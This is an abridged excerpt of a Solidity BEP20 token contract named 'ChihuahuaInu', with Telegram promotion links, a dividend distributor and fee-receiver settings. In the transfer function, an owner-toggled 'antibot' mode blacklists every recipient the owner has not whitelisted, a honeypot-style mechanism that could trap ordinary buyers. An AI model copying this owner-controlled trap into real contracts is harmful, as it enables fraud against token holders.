...
https://t.me/ChihuahuaInuPortal

by https://t.me/AngiesReviews
...
/**
 * BEP20 standard interface for token.
 */
interface IBEP20 {
...
// Libray SafeMath for basic opertaions
library SafeMath {
...
//Interface for rewards distributions
interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function setReward(address rewards) external;
    function deposit() external payable;
    function process(uint256 gas) external;
}

//Contract for rewards distribution. We distribute in BTC from BEP20
contract DividendDistributor is IDividendDistributor {
    ...
    function setReward(address rewards) external override onlyToken {
        RWRD = IBEP20(rewards);
    }
...
contract ChihuahuaInu is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "ChihuahuaInu";
    ...
    uint256 public swapThreshold = _totalSupply * 32 / 10000;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) 
    {
        ...
        if (antibotMode && recipient != owner && recipient != address(this) && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != devFeeReceiver  && recipient != autoLiquidityReceiver)
        {
            if (!isNotBot[recipient])
            {
                add_blacklist(recipient,true);
            }
        }
    ...
    function add_blacklist(address bot, bool status) internal
    {
            isBlacklisted[bot] = status;
    }
    ...
    //address that are not bot are true;
    function manage_isNotBot(address[] calldata addresses, bool status) public onlyOwner 
    {
        for (uint256 i; i < addresses.length; ++i) {
            isNotBot[addresses[i]] = status;
            //setIsFeeExempt(addresses[i],status);
        }
    }

   function enable_antibotMode(bool _status) public onlyOwner 
   {
        antibotMode = _status;
    }
    ...
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver ) external authorized 
    {
        ...
        authorizations[_marketingFeeReceiver] = true;
    }
    ...
    function setDistributorRewards(address rew) external authorized
    {
        distributor.setReward(rew);
    }
